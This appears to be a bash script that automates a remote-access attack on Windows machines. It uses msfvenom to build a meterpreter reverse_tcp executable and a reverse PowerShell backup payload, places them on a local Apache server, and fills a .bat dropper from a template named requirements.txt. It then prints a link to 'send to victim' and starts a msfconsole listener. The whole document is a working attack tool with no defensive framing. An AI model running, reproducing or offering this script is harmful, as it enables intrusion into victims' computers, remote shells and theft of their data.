#!/bin/bash

echo "calling banner..."
sleep 0.5

cat logo.txt
echo ""
echo ""

read -p "Enter Port [Example: 4444]: " port
read -p "Enter the Lhost: " lhost
read -p "Enter the Payload Name: " name

echo "Generating payload..."
msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$port -f exe > $name.exe

read -p "Enter the Backup Payload Name: " backup
msfvenom -p cmd/windows/reverse_powershell lhost=$lhost lport=$port -o $backup.sh

echo "Starting Apache server..."
sudo systemctl start apache2
sudo systemctl restart apache2.service

mv /var/www/html/index.html /var/www/
mv $name.exe /var/www/html/
mv $backup.sh /var/www/html/

read -p "Enter One More Different Payload Name: " payload
sed -e "s/\$ip/$lhost/" -e "s/\$name/$name/" -e "s/\$lhost/$lhost/" -e "s/\$backup/$backup/" requirements.txt > $payload.bat
sudo mv $payload.bat /var/www/html/

echo "Payload link (send to victim): http://$lhost/$payload.bat"

sed -e "s/\$lhost/$lhost/" meterpreter.rc > $name.rc
msfconsole -r $name.rc
